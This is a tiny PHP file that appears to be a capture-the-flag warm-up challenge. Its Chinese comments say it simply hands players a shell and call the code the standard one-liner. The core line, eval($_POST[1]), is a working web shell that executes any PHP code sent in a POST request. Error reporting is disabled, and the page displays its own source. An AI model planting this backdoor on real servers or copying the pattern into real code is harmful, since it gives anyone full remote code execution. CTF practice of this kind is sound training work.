<?php
error_reporting(0);
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);

//签到题，直接送大家shell了，做好事不留名，我叫Jay17

//标准一句话mua~
eval($_POST[1]);
?>